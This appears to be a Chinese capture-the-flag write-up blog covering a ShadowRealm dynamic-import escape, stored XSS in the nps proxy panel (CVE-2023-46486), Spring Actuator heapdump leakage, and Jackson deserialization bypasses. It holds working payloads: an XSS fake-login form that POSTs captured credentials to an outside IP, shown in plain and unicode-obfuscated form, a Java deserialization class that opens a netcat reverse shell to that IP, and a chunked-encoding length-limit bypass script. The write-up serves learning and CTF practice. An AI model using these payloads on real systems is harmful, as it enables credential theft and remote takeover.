[[Call]] The [[Call]] internal method Executes code associated with this object’s [[WrappedTargetFunction]]. [[Realm]] Realm Record The realm in which the function was created. 还有 [[Prototype]] and [[Extensible]] 对象的 [[call]] 方法获取两个参数:thisArgument, argumentsList . 调用时会实现以下步骤: 1. 设置运行代码的上下文。执行上下文通常包括执行函数的作用域、变量、this 值等信息。 2. 设置新的作用域 calleecontext. 3. 执行 assert 断言，确保 calleecontext 是目前正在执行的上下文. 4. 用 result 储存 **OrdinaryWrappedFunctionCall (F, thisArgument, argumentsList)** 的运行结果 5.calleeContext 被从执行上下文栈中移除，而 callerContext 被恢复为当前运行的执行上下文。 6. 判断返回类型，如果 [[TYPE]] 已返回，则返回 value. 7. 处理异常 8. 执行结束. dynamic import 方案 通过动态 import 允许我们按需加载 JavaScript 模块，而不会在最开始的时候就将全部模块加载。 动态 import 返回了一个 Promise 对象，这也意味着可以在 then 中等模块加载成功后去做一些操作。 所以 import 导入需要通过 then 去触发其方法. import 在执行方法后仍然是 promise 对象，采用的类似于链式调用. 123var test = import(&quot;child_process&quot;).then(m=&gt;console.log(m)) 其中 test 获取 promise 异步对象，而 m 直接就获得 child_process 对象. exp 简而言之 1ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts 支持 dynamic import “Dynamic import” 是指在 JavaScript 中动态加载模块或文件的能力。这是 ECMAScript 2020 标准的一部分，引入了 import () 函数，它可以在运行时异步加载模块。这与传统的静态 import 语句不同，后者在代码加载时即确定了要导入的模块。 12import(&#x27;child_process&#x27;).then(m=&gt;m.execSync(&#x27;/readflag &gt; /app/asserts/flag&#x27;));1; nps md 又是 xss,👴又 tnnd 不会，しね！ 🧀一个 nps 网站上的 xss. 涉及 CVE-2023-46486 项目地址 影响范围: nps&lt;=V0.26.10 你 tm 搁这放屁呢，最新版本就是这个，21 年最后 publish 了. 漏洞怎么个事: bootstrapTable 并未配置 escape 字段，且使用时不改默认配置 kokodayo,web/views/client/list.html 这里设置公钥，防止被 ntr (被别人用代理), 你也不希望你拿不到 shell 吧 (bushi) 同为代理，经常被提起的 frp 和 venom 都没太注意公钥，实际上是有公钥这一选项的. 这里，我们完全就能够通过客户端去进行攻击了. 开打😓 cnm,sbwindows, 死活用不成，linux 一下就出来了和👴😡了 √⑧玩意，当👴⭐😡吧 首先下载客户端，这一点和 frp 的 admin 端和 agent 端类似 然后配置客户端的配置文件 12345[common]server_addr=127.0.0.1:8024conn_type=tcpvkey=123remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt; × 成功了，狠狠地 × 进去 remote 干🤪 忆！悟！这就是 xss 的机器人创造 首先题目通过 js 代码造了个后台机器人，👴很喜欢 1234567891011121314151617181920212223242526272829303132333435363738394041424344import &#123;chromium, errors&#125; from &quot;playwright-chromium&quot;;const PASSWORD = &quot;DASCTF_flag&quot;;(async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000);&#125;)(); 看不懂没关系，👴来带你分析一下. 首先整个就是一坨 shit⛰, 通过一个箭头函数 () 的方式立即调用 123456const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000); 首先创建一个浏览器和上下文，然后设置 setIneterval, 表示每三十秒调用 visit, 函数，让👴看看 visit 函数怎么个事 123456789101112131415161718192021222324252627282930async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; 首先获取新页面，然后访问三次 http://a.o.com:8080/client/list 你看看眼熟不，/client/list 刚好就是刚才展示 xss 的路径，你品，你细品。这个 host 眼熟不，这可是在 docker 里面设置的地址映射啊. ならば 答えはひとつだ 就是 xss, 接下来就是分析这个机器人事怎么操作的了. 首先要看有无 button[langtag=&quot;word-login&quot;] 这玩意 那我们就需要设置一个 button 了，不过我们可以在这里面下点毒 1&lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtang=&gt;&lt;/button&gt; $(‘#username’) 是一个 jQuery 选择器，用于选择具有指定 id 属性的 HTML 元素。在这个选择器中，#username 表示要选择 id 为 “username” 的元素。会从输入获取 123&lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; value=&quot;flag&quot;&gt; 再根据这个 12await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); 让机器人去输入我们设置好的登录框，从而通过 input 获取到 flag. 12&lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt;&lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; 如此，圈套已设，只等敌军进入 1234567891011121314&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form class=&quot;m-t&quot; onsubmit=&quot;return false&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; &lt;/div&gt; &lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtag=&quot;word-login&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 这么复杂数据传输起来不方便，👴不喜欢，换一个 exp unicode 就行，而且控制台大大支持 unicode 12345[common]server_addr=node4.buuoj.cn:26658conn_type=tcpvkey=123remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0068\\u0065\\u0061\\u0064\\u003e\\u003c\\u002f\\u0068\\u0065\\u0061\\u0064\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u006d\\u002d\\u0074\\u0022\\u0020\\u006f\\u006e\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u003d\\u0022\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0055\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0050\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u0020\\u006f\\u006e\\u0063\\u006c\\u0069\\u0063\\u006b\\u003d\\u0022\\u0066\\u0065\\u0074\\u0063\\u0068\\u0028\\u0027\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0033\\u002e\\u0031\\u0034\\u0033\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0039\\u003a\\u0031\\u0031\\u0034\\u0035\\u002f\\u0027\\u002c\\u007b\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003a\\u0027\\u0050\\u004f\\u0053\\u0054\\u0027\\u002c\\u0062\\u006f\\u0064\\u0079\\u003a\\u0024\\u0028\\u0027\\u0023\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u002b\\u0027\\u005f\\u005f\\u005f\\u0027\\u002b\\u0024\\u0028\\u0027\\u0023\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u007d\\u0029\\u003b\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u006c\\u006f\\u0067\\u0069\\u006e\\u0022\\u003e\\u004c\\u006f\\u0067\\u0069\\u006e\\u003c\\u002f\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e`&lt;/sCrIpT&gt; 1./npc -config ./conf/npc.conf 终于拿到了艹，30s 点一次，👴tm 以为 x 不进去了 まだまだね、弱い！ Deserialize?Upload! actuator😫 首先，题目有个🚢♥的依赖，显然👴不知道这是干啥的，怎么办，学！ Spring boot——Actuator 详解 - 曹伟雄 - 博客园 (cnblogs.com) 配置方面 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 有了这个依赖，那么 Spring 就会自动开放 /actuator/health 和 /actuator/info 这两个路径 访问 [127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/) , 可以得到 /acturator 的路由 1234567891011121314151617181920212223242526272829303132&#123; &quot;_links&quot;: &#123; &quot;self&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator&quot;, &quot;templated&quot;: false &#125;, &quot;health&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health&quot;, &quot;templated&quot;: false &#125;, &quot;health-path&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;info&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/info&quot;, &quot;templated&quot;: false &#125;, &quot;env&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env&quot;, &quot;templated&quot;: false &#125;, &quot;env-toMatch&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;heapdump&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/heapdump&quot;, &quot;templated&quot;: false &#125; &#125;&#125; 以下是一些经常使用的路径 HTTP 方法 Endpoint Description GET /actuator 查看有哪些路径 GET /actuator/env 查看所有环境属性，看 Spring 的的 properties, 但是会自动脱敏掉一些 secret key 等敏感信息 GET /actuator/health 查看运行指标 GET /actuator/info 查看 properties 中 info 开头的属性，沒啥用 GET /actuator/heapdump 获取 JVM 的 heap dump 🤣默认 Actuator /actuator/health 和 /actuator/info 两个 endpoint，如果要开放其他 endpoint 的話，需在在 application.properties 中做设置。 Heap dump（堆转储）是指将一个 Java 进程的内存中的对象信息和数据结构以二进制格式写入文件，以便进行内存分析和排查内存泄漏等问题。Heap dump 包含了 Java 堆内存中的对象实例、对象引用关系、类信息等，它是诊断和调试 Java 应用程序的重要工具之一。 👴说点人话：反正 Heap dump 事内存相关的东西，肯定有敏感信息，👴就是要把它下下来进行一通乱超，不知道你们怎么忍得住的，事👴直接拿起来狠狠地分析. 怎么分析，当时事用 jdk 自带的 jhat 1jhat -J-Xmx512M &quot;/path/to/heapdump&quot; 然后就会本地起一个服务器，里面就加载内存的内容 md, 依托✍特， 1234public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception &#123; ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;)).permitAll().antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;)).authenticated().and()).formLogin().loginProcessingUrl(&quot;/login&quot;)).permitAll()).and()).csrf().disable(); return (SecurityFilterChain)http.build(); &#125; 🧀spring 安全配置， http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll() 表示对 / 路由访问允许任意用户， antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated() 表示 /admin/ 开头验证用户 .formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll() /login 的表达登录不需要验证 这里就是让👴拿到 password 题目实践😓😡 wcsndm,sb 东西，题目环境没了，行吧，👴本地搭一个，nmd 套模板整了个 docker-compose, 告诉👴nmd project name must not be empty , 你 tmd 倒是告诉👴哪里没有 project name, 阿米诺斯，一格德拉米. 只能手动 docker build. 同样拿到 heapdump 直接打开 1jvisualvm 别问👴哪里装，这 nmjava 自带的 进行一波 OQL 查询 1select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key) 这里用的事正则测试 /rgexp/.test () 的形式，虽然里面内容没用到啥正则，只是走个形式而已，别问👴为啥不直接查 value,nmd value 是个对象还未知，你查个√⑧. tmd /login 登进去，让👴看看怎么个事 源赖氏一个后台管理系统，能用文件上传功能的地方. 反序列化分析😛 1234567@GetMapping(&#123;&quot;/deserialize&quot;&#125;) public void deserialize(@RequestParam(&quot;b64str&quot;) String b64str) throws Exception &#123; byte[] serialized = Base64.getDecoder().decode(b64str); ByteArrayInputStream bis = new ByteArrayInputStream(serialized); SafeObjectInputStream ois = new SafeObjectInputStream(bis); ois.readObject(); &#125; 很美好对吧，jackson 链直接打，但是👴发现了不对劲，md 有毒 还是看看远处的 SafeObjectInputStream 吧 123456789101112131415161718public SafeObjectInputStream(InputStream is) throws Exception &#123; super(is); &#125; protected Class&lt;?&gt; resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException &#123; if (BLACKLIST.contains(input.getName())) &#123; throw new SecurityException(&quot;Hacker!!&quot;); &#125; else &#123; return super.resolveClass(input); &#125; &#125; static &#123; BLACKLIST.add(&quot;com.fasterxml.jackson.databind.node.POJONode&quot;); BLACKLIST.add(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;); BLACKLIST.add(&quot;java.lang.Runtime&quot;); BLACKLIST.add(&quot;java.security.SignedObject&quot;); &#125; 都给你 ban 了，rnm, 出题人真的阴险，现在不把 jackson 链 ban 了，都不敢反序列化了是吧😅 怎么绘世呢 文件上传 + 反序列化组合拳😤 题目给了文件上传的功能，那总不能不用吧，要不然题目整这 β÷ 玩意干嘛呀.😅 正好前面通过 env 泄露得知 java_home 的位置 什么，你不知道 java_home 事干嘛的？ 来，跟👴一起念: JAVA_HOME 是一个环境变量，用于指示 Java 开发工具和应用程序在计算机上的安装位置。它主要用于以下几个方面的作用： Java 开发工具的定位： JAVA_HOME 变量告诉计算机的操作系统和其他开发工具 Java 开发工具的安装位置。这对于编译、运行和调试 Java 程序非常重要。例如，当你使用 Java 编译器 ( javac ) 编译 Java 代码时，系统需要知道 JAVA_HOME 的位置以找到 javac 可执行文件。 Java 运行时环境（JRE）的定位：除了开发工具， JAVA_HOME 也可以用于定位 Java 运行时环境（JRE）的位置。JRE 包含了运行 Java 应用程序所需的类库和运行时组件。如果你的系统上有多个不同版本的 Java 安装，设置 JAVA_HOME 可以确保你使用的是正确的 Java 版本。 应用程序的定位：某些 Java 应用程序可能需要知道 Java 的安装位置，以便正确配置自己。通过设置 JAVA_HOME 环境变量，这些应用程序可以轻松找到所需的 Java 运行时环境。 开发工具和构建工具的配置：许多 Java 集成开发环境（IDE）和构建工具（如 Maven 和 Gradle）使用 JAVA_HOME 变量来配置其内部使用的 Java 环境。这有助于确保项目在正确的 Java 版本下编译和运行。 跨平台兼容性：通过使用 JAVA_HOME 变量，可以使 Java 开发环境在不同的操作系统上更具可移植性。它允许开发人员编写一次代码，然后在不同平台上使用相同的 JAVA_HOME 变量来运行代码。 总之， JAVA_HOME 是一个关键的环境变量，用于确保计算机上的 Java 开发工具、应用程序和运行时环境能够正确地找到和使用 Java 安装。它在 Java 开发和部署过程中起到重要作用，特别是在多版本 Java 安装和跨平台开发的情况下。 不说人话就是这样，这是伟大的 ChatGPT 说的，👴翻译一下就是，运行脚本的位置在那，要运行的 class 也在那，所以有啥 class 放那，他就能加载啥 class. 所以接下来要干啥懂了没，上传点具有攻击性的 class 到 javahome 里面，狠狠地入它一波. 而且不是有反序列化吗，到这你不可能还不知道吧，创造一个反序列化带有直接恶意操作的类，直接 getshell😊 12345678910111213141516171819202122import java.io.*;public class exp implements Serializable &#123; private void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException &#123; in.defaultReadObject(); Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;nc&quot;,&quot;43.143.192.19&quot;,&quot;1145&quot;,&quot;-e&quot;,&quot;/bin/sh&quot;&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); p.waitFor(); if(p.exitValue()!=0)&#123; &#125; String s = null; while((s=reader.readLine())!=null)&#123; System.out.println(s); &#125; &#125;&#125; 写个 exp 类，编译好后再上传，别直接 sb 到把 java 上传了 但是👴不太高兴，因为有点 bug, 第一次搭 docker 打不成，第二次终出了😒. DASCTFXCBCTF_2023_bypassJava 真 tm 恶心的 java 题，不仅有绕过，还 tm 有 RASP 这种抽象的东西，👴太弱了，👴要学. 题目环境甚至不是靶机，而是静态资源，很不爽. 还好出题人开源了:pankass/DASCTF_X_CBCTF2023_bypassJava: 题目源码和 docker 环境 (github.com) Content-Length 限制 不多说，第一时间想到 jackson 链子，但是有长度限制 这长度限制是人能想出来的吗😓,nm 稍微大一点，随便不都得几千？ 过不了，根本过不了，让我看看 bypass 怎么个事: 这里如果头部有 transfer-encoding, 就会进 addInputFilter 这里面如果有 chunked, 那么就会设置成 this.contentDelimitation 为 true 最后这里就会进入 if, 从而设置 ContentLength 为 - 1, 绕过长度限制. chuncked 编码怎么发 分块编码（Transfer-Encoding: chunked） - 妙音天女 - 博客园 (cnblogs.com) 简单看一下们大概就是 123456十六进制长度/r/n content/r/n .... 0/r/n /r/n 每一块都是 十六进制表示长度 然后， /r/n 接着输入 content, 然后 /r/n 最后一块一定要输入 0/r/n/r/n 👴浅浅写个脚本 1234567891011121314import requestsurl = &quot;http://127.0.0.1:8080/read&quot;content = open(&quot;data.txt&quot;,&quot;r&quot;).read()leng = hex(len(content)).replace(&quot;0x&quot;,&quot;&quot;)body = leng+&quot;\\r\\n&quot;+content+&quot;\\r\\n0\\r\\n\\r\\n&quot;print(body)headers= &#123;&quot;transfer-encoding&quot;:&quot;chunked&quot;&#125;res = requests.post(url=url,data=body,headers=headers) soeasy,🤣, 然而这只是第一步，👴现场甚至第一步都没过去. 不稳定 jackson 链问题 关于 java 反序列化中 jackson 链子不稳定问题 (pankas.top) 从 JSON1 链中学习处理 JACKSON 链的不稳定性 - 先知社区 (aliyun.com) 👴ctmd 打 jackson 链子的时候，有史以来第一次遇见了陌生的报错 1com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[&quot;stylesheetDOM&quot;]) 且经过本地调试，似乎进入了陌生的代码段，👴很不乐意. 具体来说，就是在调用 getters 的时候，优先奏了 getStylesheetDOM 这个方法，但是，众所周知，我们在序列化的时候，是不会去设置这个值的，所以理所应当的，nmd 空指针了.😓😅而当其调用 getter 方法时优先调用 getOutputProperties 方法时才是我们正常想要的结果。 这 nm 真有坑啊，比赛想打这条链子，不说 ban 位问题，nmd 这问题也只能通过不停地重置靶机解决了，比赛你重置靶机，静态地址等似吧. 现在👴来分析一下怎么个事，优化一下 流程 这条链子分析👴不想说了，闭着眼睛都知道怎么个事. 关键是触发 POJONode 的 toString 方法，然后内部经过一系列序列化器调用 POJONode 中封的 _value 属性的 getter 方法，从而调用 TemplatesImpl 类型对象的 getOutputProperties 方法从而导致执行任意代码。 重点就是从 toString 到 getters 的调用这一过程 栈调试放在这: 1234567891011121314151617181920getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) 在 com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField 方法中利用反射来执行其 getters 方法 这次就调用了 getoutputProperties, 很好，👴喜欢🤪 那就往前看看哪里获取了 getters 在 com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields 中， prop 数组存储了 getters , 通过循环遍历所有 getters 并调用 serializeAsField 追踪一下这个变量，从 _props 获得 最终在 com.fasterxml.jackson.databind.introspect 赋值 12345678910111213141516171819202122collectAll:418, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)getJsonValueAccessor:270, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)findJsonValueAccessor:258, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)findSerializerByAnnotations:391, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)_createSerializer2:224, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)createSerializer:173, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)_createUntypedSerializer:1495, SerializerProvider (com.fasterxml.jackson.databind)_createAndCacheUntypedSerializer:1443, SerializerProvider (com.fasterxml.jackson.databind)findValueSerializer:544, SerializerProvider (com.fasterxml.jackson.databind)findTypedValueSerializer:822, SerializerProvider (com.fasterxml.jackson.databind)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) 这里就是第一次决定 getters 顺序 随后通过 getDeclaredMethods 获取方法，那这里获取方法的顺序是不固定的。 并且，在 com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer 方法里，会将获取的方法顺序进行缓存，之前提到过了，缓存后会进入其它 if。 因此第一次打不通，之后也无法打通了 为什么顺序不一定 